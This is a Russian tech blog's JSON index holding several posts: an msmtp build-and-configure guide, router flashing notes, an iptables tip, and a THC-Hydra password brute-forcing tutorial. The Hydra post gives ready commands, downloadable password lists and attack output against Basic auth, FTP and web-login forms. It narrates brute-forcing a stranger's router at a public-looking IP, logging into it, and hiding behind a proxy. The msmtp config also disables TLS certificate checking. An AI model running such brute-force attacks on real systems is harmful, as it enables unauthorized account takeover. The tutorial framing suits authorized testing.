команду в крон.\n","date":"2016-07-13T17:24:26Z","image":"https://blog.hook.sh/rclone-work-with-yandex-disk/cover_hu008cf66a99114a919f30e1ebc174804c_100692_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/rclone-work-with-yandex-disk/","title":"Дружим rclone с Яндекс.Диском"},{"content":"msmtp - это простой консольный клиент для отправки сообщений электронной почты по протоколу SMTP.\nМожно, конечно, пойти сложным путем и поставить полноценный почтовый сервер, но зачем? Нам ведь требуется просто позволить скриптам и демонам отправлять почту, а заморачиваться с DKIM, SPF, заголовками и прочим - крайне лень. Поэтому мы будем отправлять почту с помощью почтового ящика на yandex.ru, и поможет нам в этом приложение под названием msmtp.\n Важное замечание - в моем случае домен уже делегирован на яндекс, в DNS имеются все необходимые записи, почтовый ящик создан на странице pdd.yandex.ru, к нему прописаны алиасы вида no-reply, noreply, donotreply, do-not-reply для того, что бы была возможность иметь почтовый ящик с именем info@domail.ru, но успешно отправлять письма от имени, например, no-reply@domail.ru.\n Единственное \u0026ldquo;но\u0026rdquo; - в репозиториях находится старая и бажная версия. Самый критичный для нас баг - это неизменяемое поле Sender, т.е. мы не можем указать имя (или адрес? не помню) отправителя. Смотрим что есть в репозиториях:\n$ yum info msmtp # ... Name : msmtp Version : 1.4.32 Release : 1.el7 Size : 120 k # ... Смотрим информацию о релизах на официальном сайте - на момент написания этих строк это версия 1.6.5 (уже без описанного выше бага).\n Все манипуляции производились на \u0026ldquo;чистой\u0026rdquo; системе CentOS 7.2.\n Скачаем исходники и соберем приложение ручками.\n$ cd ~ $ yum install git $ git clone git://git.code.sf.net/p/msmtp/code msmtp $ cd msmtp Ставим все необходимые для сборки пакеты:\n$ yum install automake gcc gettext-devel gnutls-devel openssl-devel texinfo Запускаем autoreconf:\n$ autoreconf -i autoreconf: configure.ac: AM_GNU_GETTEXT is used, but not AM_GNU_GETTEXT_VERSION configure.ac:31: installing \u0026#39;build-aux/config.guess\u0026#39; configure.ac:31: installing \u0026#39;build-aux/config.sub\u0026#39; configure.ac:34: installing \u0026#39;build-aux/install-sh\u0026#39; configure.ac:34: installing \u0026#39;build-aux/missing\u0026#39; Makefile.am: installing \u0026#39;./INSTALL\u0026#39; doc/Makefile.am:3: installing \u0026#39;build-aux/mdate-sh\u0026#39; src/Makefile.am: installing \u0026#39;build-aux/depcomp\u0026#39; Конфигуряем:\n$ ./configure # ... Install prefix ......... : /usr/local TLS/SSL support ........ : yes (Library: GnuTLS) # \u0026lt;-- ВАЖНО GNU SASL support ....... : no IDN support ............ : no NLS support ............ : yes Libsecret support (GNOME): no MacOS X Keychain support : no И если предыдущая операция завершилась успешно (наличие поддержки TLS/SSL для нас критично), то собираем:\n$ make  Если во время сборки вылезла ошибка вида:\n *** error: gettext infrastructure mismatch: using a Makefile.in.in from gettext version 0.19 but the autoconf macros are from gettext version 0.18 make[2]: *** [stamp-po] Error 1 make[2]: Leaving directory `/root/msmtp/po\u0026#39; make[1]: *** [all-recursive] Error 1 make[1]: Leaving directory `/root/msmtp\u0026#39; make: *** [all] Error 2  То правим один файл:\n $ nano ./po/Makefile.in.in  Где заменяем строку GETTEXT_MACRO_VERSION = 0.19 на GETTEXT_MACRO_VERSION = 0.18. После этого повторяем:\n $ make Выполняем установку только при успешной сборке (отсутствии каких-либо ошибок):\n$ make install Проверяем:\n$ /usr/local/bin/msmtp --version msmtp version 1.6.5 Platform: x86_64-unknown-linux-gnu TLS/SSL library: GnuTLS # \u0026lt;-- ВАЖНО Authentication library: built-in Supported authentication methods: plain external cram-md5 login IDN support: disabled NLS: enabled, LOCALEDIR is /usr/local/share/locale Keyring support: none System configuration file name: /usr/local/etc/msmtprc User configuration file name: /root/.msmtprc Copyright (C) 2016 Martin Lambers and others. This is free software. You may redistribute copies of it under the terms of the GNU General Public License \u0026lt;http: //www.gnu.org/licenses/gpl.html\u0026gt;. There is NO WARRANTY, to the extent permitted by law.\u0026lt;/http:\u0026gt; Создаем симлинки и заменяем \u0026ldquo;стандартный\u0026rdquo; sendmail (убедись предварительно что он удален/не установлен):\n$ ln -s /usr/local/bin/msmtp /etc/alternatives/mta $ ln -s /usr/local/bin/msmtp /usr/bin/msmtp $ ln -s /etc/alternatives/mta /usr/lib/mail $ ln -s /etc/alternatives/mta /usr/bin/mail $ ln -s /etc/alternatives/mta /usr/sbin/mail $ ln -s /etc/alternatives/mta /usr/lib/sendmail $ ln -s /etc/alternatives/mta /usr/bin/sendmail $ ln -s /etc/alternatives/mta /usr/sbin/sendmail Создаем системный конфиг и симлинк на него в /etc:\n$ touch /usr/local/etc/msmtprc $ ln -s /usr/local/etc/msmtprc /etc/msmtprc Выставляем права на файл и меняем группу файла для того, чтобы php-fpm (и другие члены этой группы) смогли читать его:\n$ chmod 640 /usr/local/etc/msmtprc $ chown :www-data /usr/local/etc/msmtprc После этого переходим непосредственно к настройке:\n$ nano /etc/msmtprc defaults tls on auth on tls_starttls on tls_certcheck off logfile /var/log/msmtp.log timeout 20 account yandex host smtp.yandex.ru port 587 maildomain your_domain_name.ru from no-reply@your_domain_name.ru keepbcc on user your_mailbox_name@your_domain_name.ru password MAILBOX_PASSWORD account default : yandex И проверяем работу запуская как из консоли, так и из php-скрипта:\n$ echo -e \u0026#34;\\nSome test 1\u0026#34; | msmtp -d your_another_email@gmail.com $ php -r \u0026#34;mail(\u0026#39;your_another_email@gmail.com\u0026#39;,\u0026#39;Subject\u0026#39;,\u0026#39;Some test 2\u0026#39;);\u0026#34; Письма должны успешно приходить на your_another_email@gmail.com. Так же стоит проверить работу непосредственно из-под php-fpm, например, таким скриптом:\n\u0026lt;?php set_time_limit(15); error_reporting(E_ALL); ini_set(\u0026#39;display_errors\u0026#39;, 1); $result = mail(\u0026#39;your_another_email@gmail.com\u0026#39;, \u0026#39;Subject\u0026#39;, \u0026#39;Some test 3\u0026#39;); echo \u0026#39;\u0026lt;pre\u0026gt;\u0026#39;; var_dump($result); echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; if ($result) { echo \u0026#39;все путем\u0026#39;; } else { echo \u0026#39;что-то не так\u0026#39;; } И обратившись к нему из web. Если необходимо позволить какому-либо локальному пользователю так же из консоли отправлять письма, то необходимо создать новую группу, и добавить в неё необходимых пользователей, не забыв так же добавить в неё и php-fpm.\nНесколько почтовых ящиков и nginx Так как на одном сервере могут располагаться несколько сайтов - наверняка возникнет потребность отправлять письма с разных сайтов от разных отправителей. Поясню - на одном сервере расположены сайты с доменными именами site1.ru и site2.ru. Соответственно, отправитель в исходящих письмах с сайта site1.ru должен быть вида robot@site1.ru, а в исходящих письмах с сайта site2.ru - вида robot@site2.ru. Для того что бы этого добиться нам необходимо прописать требуемые аккаунты в файле настроек msmtp:\ndefaults tls on auth on tls_starttls on tls_certcheck off logfile /var/log/msmtp.log timeout 20 account site1 host smtp.yandex.ru port 587 maildomain site1.ru from robot@site1.ru user robot@site1.ru password password_here account site2 host smtp.yandex.ru port 587 maildomain site2.ru from robot@site2.ru user robot@site2.ru password password_here account default : site1 Теперь по умолчанию письма будут уходить от имени аккаунта site1, так как он у нас указан как аккаунт по умолчанию. Для того что бы сообщить скриптам на сайте site2.ru использовать аккаунт site2 необходимо добавить следующую строку в конфигурацию сервера site2.ru nginx:\nlocation ~ \\.php$ { # ...  fastcgi_param PHP_VALUE \u0026#34;sendmail_path = /usr/sbin/sendmail -t -i -a site2\u0026#34;; # ...  } И после этого всё начнет работать так как надо.\n","date":"2016-06-28T22:24:10Z","image":"https://blog.hook.sh/compile-and-config-msmtp/cover_hub577c79af8463c924351e5a1445741f0_93501_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/compile-and-config-msmtp/","title":"Собираем и настраиваем msmtp"},{"content":" Статья носит носит строго познавательный характер, за применение кем либо описанных в статье методик автор ответственности не несет.\n В тот момент, когда пинтест заходит в тупик - одним из крайних аргументов в тесте на проникновение является подбор паролей. Сервисы, к которым можно применить данный метод атаки - самые различные. А как следствие - различны и протоколы, и форматы обращений. Надо бы как то унифицировать инструменты для решения этой задачи - не хорошо под каждый новый случай писать новый брутер своими ручками.\nИ такой инструмент уже имеет место быть. Быстрый, сочный, достойный внимания - THC-Hydra. Версия 7.5 (из репозитория epel) поддерживает подбор по/для: asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp rexec rlogin rsh sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp. Примеры эксплуатации мы рассмотрим чуть ниже, а пока - посмотрим как можно заполучить данный инструмент в свой арсенал.\nУстановка Пользователям CentOS будет достаточно подключить репозиторий epel и выполнить:\n# yum install -y epel-release $ yum install -y hydra Или для сборки из сорсов (актуально для linux, *bsd, solaris и т.д., а так же MacOS и мобильных системах, базирующихся на Linux):\n$ mkdir ~/hydra_src \u0026amp;\u0026amp; cd ~/hydra_src $ wget https://github.com/vanhauser-thc/thc-hydra/archive/master.zip \u0026amp;\u0026amp; unzip master.zip \u0026amp;\u0026amp; rm -f master.zip $ cd thc-hydra-master/ $ yum install gcc mysql-devel libssh # Для Debian - libmysqld-dev и libssh-dev $ make clean \u0026amp;\u0026amp; ./configure $ make \u0026amp;\u0026amp; make install $ ./hydra -h Hydra v8.2-dev 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SOuvVd46] [service://server[:PORT][/OPT]] Options: -R restore a previous aborted/crashed session -S perform an SSL connect -s PORT if the service is on a different default port, define it here -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -x MIN:MAX:CHARSET password bruteforce generation, type \u0026#34;-x -h\u0026#34; to get help -e nsr try \u0026#34;n\u0026#34; null password, \u0026#34;s\u0026#34; login as pass and/or \u0026#34;r\u0026#34; reversed login -u loop around users, not passwords (effective! implied with -x) -C FILE colon separated \u0026#34;login:pass\u0026#34; format, instead of -L/-P options -M FILE list of servers to attack, one entry per line, \u0026#39;:\u0026#39; to specify port -o FILE write found login/password pairs to FILE instead of stdout -f / -F exit when a login/pass pair is found (-M: -f per host, -F global) -t TASKS run TASKS number of connects in parallel (per host, default: 16) -w / -W TIME waittime for responses (32s) / between connects per thread -4 / -6 use IPv4 (default) / IPv6 addresses (put always in [] also in -M) -v / -V / -d verbose mode / show login+pass for each attempt / debug mode -O use old SSL v2 and v3 -q do not print messages about connection errors -U service module usage details server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) service the service to crack (see below for supported protocols) OPT some service modules support additional input (-U for module help) Examples: hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 hydra -l admin -p password ftp://[192.168.0.0/24]/ hydra -L logins.txt -P pws.txt -M targets.txt ssh  По умолчанию бинарники гидры будут в директории /usr/local/bin/, ежели что пропиши этот путь в ~/.bash_profile, дописав его в переменной PATH.\n  При сборке из сорсов мы разумеется получаем самую свежую и сочную версию. В репах как правило лежит уже несколько устаревшая.\n И ещё более простой вариант - использовать дистрибутив Kali Linux - там уже всё есть.\nСловари Брутить можно как с помощью подбора посимвольно, так и с помощью подготовленного словаря наиболее часто используемых паролей. Таки рекомендую первым делом попытаться подобрать пароль со словарем, и уже если и этот способ не увенчался успехом - переходить к прямому бруту посмивольно.\nГде взять словари? Например, можно пошариться на этой странице или глянуть сразу здесь - имена архивов более чем говорящие. От себя лишь скажу, что использую в основном 3 словаря:\n Очень маленький и очень популярный (топ первые 500 паролей) Второй побольше - на 5000 паролей Третий от Cain \u0026amp; Abel на ~300000 паролей  И в таком же порядке их применяю во время теста. Второй словарь - это слитые воедино несколько других не менее популярных списков (отсортированный с удалением дубликатов и комментариев) который можно получить, например, так:\n$ cat twitter-banned.txt 500-worst-passwords.txt lower john.txt password | grep -v \u0026#39;^#\u0026#39; | sort -u \u0026gt; all_small_dic.txt В качестве бонуса можешь забрать готовые списки паролей (top500; top4000; cain\u0026amp;abel (300k); пароли от яндекса (700k); пароли от маил.ру (2740k); маил.ру + яндекс (3300k)):\n passwords_list.zip  В общем, считаем что словари у тебя готовы к применению. Как пользоваться гидрой?\nЯ есть Грут Брут Какие настройки и возможности предоставляет нам гидра? Давай рассмотрим флаги запуска по порядку:\n   Флаг Описание     -R Восстановить предыдущую сессию, которая по какой-либо причине была прервана   -S Использовать SSL соединение   -s PORT Указание порта (отличного от дефолтного) сервиса   -l LOGIN Использовать указанный логин для попытки аутентификации   -L FILE Использовать список логинов из указанного файла   -p PASS Использовать указанный пароль для попытки аутентификации   -P FILE Использовать список паролей из указанного файла   -x Генерировать пароли для подбора самостоятельно, указывается в формате -x MIN:MAX:CHARSET, где MIN - это минимальная длинна пароля, MAX - соответственно, максимальная, а CHARSET - это набор символов, в котором a означает латиницу в нижнем регистре, A - в верхнем регистре, 1 - числа, а для указания дополнительных символов - просто укажи их как есть. Вот несколько примеров генерации паролей: -x 3:5:a - длинной от 3 до 5 символов, состоящие только из символов латиницы в нижнем регистре; -x 5:8:A1 - длинной от 5 до 8 символов, состоящие из символов латиницы в верхнем регистре + цифр; -x 1:3:/ - длинной от 1 до 3 символов, состоящие только из символов слеша /; -x 5:5:/%,.- - длинной в 5 символов, состоящие только из символов /%,.-   -e nsr Укажи n для проверки пустых паролей, s для попытки использования в качестве пароля - логин, и (или) r для попытки входа под перевернутым логином   -u Пытаться подобрать логин а не пароль   -C FILE Использовать файл в формате login:pass вместо указания -L/-P   -M FILE Файл со списком целей для брутфорса (можно с указанием порта через двоеточие), по одному на строку   -o FILE Записать подобранную пару логин/пароль в файл, вместо того чтоб просто вывести в stdout (будет указан с указанием сервера, к которому подобран - не запутаешься)   -f / -F Прекратить работу, как только первая пара логин:пароль будет подобрана. -f только для текущего хоста,-F - глобально   -t TASKS Количество параллельных процессов (читай - потоков). По умолчанию 16   -w Таймаут для ответа сервера. По умолчанию 32 секунды   -W Таймаут между ответами сервера   -4 / -6 Использовать IPv4 (по умолчанию) или IPv6 адреса (при указании с -M всегда заключай в [])   -v Более подробный вывод информации о процессе   -V Выводить каждый подбираемый логин + пароль   -d Режим дебага   -O Использовать старый SSL v2 и v3   -q Не выводить сообщения об ошибках подключения   -U Дополнительная информация о использовании выбранного модуля   -h Вывод справочной информации    Гидра - фас! Теперь давай рассмотрим пример работы на определенных целях. Все IP - вымышленные, соответствие с реальными - чистейшей воды совпадение ;)\n Ахтунг! Юзай proxy/socks/vpn для безопасности собственной задницы. Так, сугубо на всякий случай\n Basic Authentication Например, сканируя диапазон адресов мы натыкаемся на некоторый интерфейс, доступный по http протоколу, но закрытый для доступа при помощи Basic Authentication (пример настройки с помощью nginx):\n screen \nИ у нас стоит задача вспомнить наш же забытый пароль ;) Давай определимся с тем, какие данные у нас есть:\n IP сервера 192.168.1.2 Сервис http Путь, который закрыт для нас запросом пары логин:пароль /private/ Порт, на котором работает http сервер 80 (стандартный)  Предположим (или любым доступным путем выясним), что логин используется admin, и нам неизвестен лишь пароль. Подбирать будем с помощью заранее подготовленного словаря и с использованием модуля http-get:\n$ hydra -l admin -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/ Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 13:01:25 [DATA] max 16 tasks per 1 server, overall 64 tasks, 488 login tries (l:1/p:488), ~0 tries per task [DATA] attacking service http-get on port 80 [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!\u0026#34; - 1 of 488 [child 0] [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!!!\u0026#34; - 2 of 488 [child 1] [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!!!!\u0026#34; - 3 of 488 [child 2] ... [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrat0r\u0026#34; - 250 of 488 [child 0] [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrator\u0026#34; - 251 of 488 [child 2] [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrator1\u0026#34; - 252 of 488 [child 13] [80][http-get] host: 192.168.1.2 login: admin password: admin # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ [STATUS] attack finished for 192.168.1.2 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-12 13:01:26 $ cat ./hydra_result.log # Hydra v8.1 run at 2015-08-12 13:01:25 on 192.168.1.2 http-get (hydra -l admin -P /root/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/) [80][http-get] host: 192.168.1.2 login: admin password: admin # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Пабам - и через 1 секунду стандартный пароль admin успешно сбручен!\nFTP Другой пример - случайно находим в сети роутер MikroTik, да с открытыми наружу портами 80 (http) и 21 (ftp). Решаем сообщить его владельцу о наличии данной неприятности, но для этого нужно сперва получить доступ к этому самому микротику.\nБрутить вебморду микротика можно, но проходит это значительно медленнее, чем например брутить ftp. А мы знаем, что стандартный логин на микротиках admin, и используется один пароль ко всем сервисам. Получив пароль для ftp - получим доступ ко всему остальному:\n screenshot \nИсходные данные:\n IP сервера 178.72.83.246 Сервис ftp Стандартный логин admin Порт, на котором работает ftp сервер 21 (стандартный)  Запускаем гидру:\n$ hydra -l admin -P ~/pass_lists/all_small_dic.txt -o ./hydra_result.log -f -V -s 21 178.72.83.246 ftp И наблюдаем процесс подбора (~900 паролей в минуту):\n[DATA] max 16 tasks per 1 server, overall 64 tasks, 4106 login tries (l:1/p:4106), ~4 tries per task [DATA] attacking service ftp on port 21 [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;\u0026#34; - 1 of 4106 [child 0] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!@#$%\u0026#34; - 2 of 4106 [child 1] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!@#$%^\u0026#34; - 3 of 4106 [child 2] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!@#$%^\u0026amp;\u0026#34; - 4 of 4106 [child 3] ... [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;adminadmin\u0026#34; - 249 of 488 [child 5] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrat0r\u0026#34; - 250 of 488 [child 0] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrator\u0026#34; - 251 of 488 [child 14] [21][ftp] host: 178.72.83.246 login: admin password: adminadmin # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ [STATUS] attack finished for 178.72.83.246 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-12 13:46:51 Спустя каких то 30 секунд ещё один словарный пароль adminadmin был успешно подобран. После этого успешно логинимся в веб-панель:\n screenshot \nВыясняем контакты администратора, сообщаем ему о наличии уязвимости, и больше ничего не делаем ;)\nВеб - авторизация Например - мы забыли пароль к роутеру, который использует веб-авторизацию. Т.е. не просто \u0026ldquo;выплывающее окошко браузера\u0026rdquo;, а полноценные поля для ввода пары логин:пароль. Давай попытаемся подобрать пароль и к нему. В рассматриваемом примере это OpenWrt:\n screenshot \nОткрываем панель отладки браузера (F12 в Chromium-based браузерах), вкладка Network и отмечаем галочкой Preserve log. После этого вводим пароль, например, test_passw0rd (логин у нас уже введен), жмем кнопку \u0026ldquo;Login\u0026rdquo;, и смотрим в консоли что и куда уходит:\n screenshot \nОтлично, теперь давай подытожим те данные, которыми мы располагаем:\n IP сервера 178.72.90.181 Сервис http на стандартном 80 порту Для авторизации используется html форма, которая отправляет по адресу http://178.72.90.181/cgi-bin/luci методом POST запрос вида username=root\u0026amp;password=test_passw0rd В случае не удачной аутентификации пользователь наблюдает сообщение Invalid username and/or password! Please try again.  Приступим к запуску гидры:\n$ hydra -l root -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 178.72.90.181 http-post-form \u0026#34;/cgi-bin/luci:username=^USER^\u0026amp;password=^PASS^:Invalid username\u0026#34; И тут надо кое-что пояснить. Мы используем http-post-form потому как авторизация происходит по http методом post. После указания этого модуля идет строка /cgi-bin/luci:username=^USER^\u0026amp;password=^PASS^:Invalid username, у которой через двоеточие (:) указывается:\n Путь до скрипта, который обрабатывает процесс аутентификации. В нашем случае это /cgi-bin/luci Строка, которая передается методом POST, в которой логин и пароль заменены на ^USER^ и ^PASS^ соответственно. У нас это username=^USER^\u0026amp;password=^PASS^ Строка, которая присутствует на странице при неудачной аутентификации. При её отсутствии гидра поймет что мы успешно вошли. В нашем случае это Invalid username  Подбор в моем случае идет довольно медленно (~16 паролей в минуту), и связано это в первую очередь с качеством канала и способностью железки обрабатывать запросы. Как мы видим - ей довольно тяжело это делать:\nHydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 14:15:12 [DATA] max 16 tasks per 1 server, overall 64 tasks, 488 login tries (l:1/p:488), ~0 tries per task [DATA] attacking service http-post-form on port 80 [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;!\u0026#34; - 1 of 488 [child 0] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;!!!\u0026#34; - 2 of 488 [child 1] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;!!!!\u0026#34; - 3 of 488 [child 2] # ... [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;%username%1\u0026#34; - 18 of 488 [child 1] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;%username%12\u0026#34; - 19 of 488 [child 2] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;%username%123\u0026#34; - 20 of 488 [child 15] [STATUS] 20.00 tries/min, 20 tries in 00:01h, 468 to do in 00:24h, 16 active Подбор пароля по словарю ничего нам не дал, поэтому мы запустим посимвольный перебор. Длину пароля возьмем от 5 до 9 символов, латиницу в нижнем регистре с цифрами и символами !@#:\n$ hydra -l root -x \u0026#34;5:9:a1\\!@#\u0026#34; -o ./hydra_result.log -f -V -s 80 178.72.90.181 http-post-form \u0026#34;/cgi-bin/luci:username=^USER^\u0026amp;password=^PASS^:Invalid username\u0026#34; И видим что процесс успешно запустился:\nHydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 14:31:01 [WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort... [DATA] max 16 tasks per 1 server, overall 64 tasks, 268865638400000 login tries (l:1/p:268865638400000), ~262564100000 tries per task [DATA] attacking service http-post-form on port 80 [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaaa\u0026#34; - 1 of 268865638400000 [child 0] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaab\u0026#34; - 2 of 268865638400000 [child 1] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaac\u0026#34; - 3 of 268865638400000 [child 2] # ... [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa7\u0026#34; - 30 of 268865638400000 [child 0] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa8\u0026#34; - 31 of 268865638400000 [child 2] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa9\u0026#34; - 32 of 268865638400000 [child 1] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa@\u0026#34; - 33 of 268865638400000 [child 11] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa#\u0026#34; - 34 of 268865638400000 [child 4] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaba\u0026#34; - 35 of 268865638400000 [child 7] И понимая безысходность данного подхода останавливаем процесс, возвращаясь к перебору по большому словарю.\nКстати, для запуска hydra в фоне с продолжением её работы после того, как ты отключишься от ssh можно поступить следующим образом:\n$ hydra -bla -bla -bla -o ./hydra_result.log # Нажимаем CTRL + Z $ disown -h %1 # После этого отключаемся или продолжаем работу # Для возврата к процессу перебора выполни \u0026#39;$ bg 1\u0026#39; # Для того, чтоб после посмотреть работает ли гидра выполни: $ ps ax | grep hydra # А для того чтоб убить все процессы с гидрой: $ for proc in $(ps ax | grep hydra | cut -d\u0026#34; \u0026#34; -f 1); do kill $proc; done; Вместо заключения Не ленись настраивать на своих сервисах/железках защиту от брутфорса. Не используй фуфлыжные пароли. Не расценивай данный материал как призыв к каким-либо действиям. Используй для тестирования своих сервисов.\n","date":"2015-08-12T10:05:15Z","image":"https://blog.hook.sh/hydra-bruteforce-passwd/cover_hu11c621eb481740cf2341ae6f4505da8a_36564_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/hydra-bruteforce-passwd/","title":"Брутим пароли с Гидрой (hydra)"},{"content":"При прошивки данной железки возникают некоторые вопросы, ответы на которые найти порой не так просто. Сейчас постараюсь ответить на основные:\n Можно ли установить на него dd-wrt или open-wrt? - Нет, не заведется, к сожалению Можно ли установить wive-ng? - Да, но \u0026ldquo;глючит\u0026rdquo; на столько, что работать с железкой в итоге не представляется возможным Можно ли после экспериментов \u0026ldquo;откатиться\u0026rdquo; на официальную версию? - Да, и это делается очень просто  Итак, если у тебя появится желание экспериментировать с железкой, то имей в виду следующие моменты:\n  Для того, чтоб выполнять манипуляции с прошивкой роутера необходимо его запустить в Recovery mode. Для этого:\n Вынимаем штекер питания роутера Нажимаем и удерживаем клавишу Reset роутера Вставляем штекер питания роутера, продолжая удерживать нажатой клавишу Reset Когда диод WPS начнет медленно мигать (через ~5 секунд) - отпускаем клавишу Reset Последующее простое выключение/включение роутера заставит его запуститься в стандартном режиме    Для прошивки роутера лучше всего его подключать патч-кордом напрямую к сетевой карте машины с которой будет производиться его прошивка. Оставлять включенным только одно сетевое подключение, всё лишнее - выключать\n  IP адрес выставлять 192.168.1.2 и только. Маска подсети 255.255.255.0. Использование любого другого адреса приводит к тому, что железка не обнаруживается и не прошивается\n  То что 192.168.1.1 (роутер) в Recovery mode не пингуется - нормально, не стоит переживать\n  Для прошивки можно использовать как tftpd, так и утилиту от Asus Firmware Restoration. Вторая проще, и выполняет по видимому всё тот же tftp put %файл%\n  Все основные файлы, которые тебе могут понадобиться как для экспериментов, так и восстановления на сток находятся по ссылкам ниже (прошивки openwrt, Wive-WR и сток находятся в директории ./firmware):\n Скачать  Ссылки по теме  Openwrt wiki касательно этой железки Прошивка роутера Asus RT-G32 C1 на Wive-NG-RTNL ","date":"2015-07-18T10:10:13Z","image":"https://blog.hook.sh/firmware-rt-g32/cover_hufd73581b96404e67b5185b9cf7a13a3b_10015_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/firmware-rt-g32/","title":"Прошивка роутера Asus RT-G32 ver. C1"},{"content":"При сканировании портов целевой системы можно довольно часто наблюдать результат вида:\n... 8080/tcp filtered http-proxy ... Что говорит нам о том что порт наверняка используется системой, но \u0026ldquo;прикрыт\u0026rdquo; извне. Несмотря на то, что работать с ним врятли будет возможно - он всё же дает исследуемому дополнительную информацию об исследуемой системе.\nКак проще всего прикрыть порт извне используя iptables?\n$ iptables -A INPUT -p tcp --dport %номер_порта% -j DROP А как можно прикрыть его так, чтоб он был недоступен только лишь извне, да ещё и не отображался в результатах nmap как filtered?\n$ iptables -A INPUT ! -s 127.0.0.1/8 -p tcp --dport %номер_порта% -j REJECT --reject-with tcp-reset  Если по-человечески, то это означает:\nДля всех входящих пакетов (кроме локального хоста (127.0.0.1/8)), приходящих по протоколу tcp на порт %номер_порта% ответить ICMP уведомлением tcp-reset, после чего пакет будет \u0026ldquo;сброшен\u0026rdquo;.\nТак же возможны варианты ICMP ответа: icmp-net-unreachable, icmp-host-unreachable, icmp-port-unreachable, icmp-proto-unreachable, icmp-net-prohibited и icmp-host-prohibited.\n После чего не забудьте выполнить:\n$ service iptables save $ service iptables restart  Для выполнения $ service iptables save в системе должен присутствовать пакет iptables-services\nЕсли в системе работает fail2ban обязательно перед выполнением $ service iptables save остановите его, выполнив $ service fail2ban stop\n ","date":"2015-07-14T08:59:58Z","image":"https://blog.hook.sh/little-iptables-tips/cover_huca17b364cb926e2346fafd474740dcec_161710_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/little-iptables-tips/","title":"Маленькая хитрость iptables"},{"content":" Honeypot («Ловушка») (англ. горшочек с мёдом) — ресурс, представляющий собой приманку для 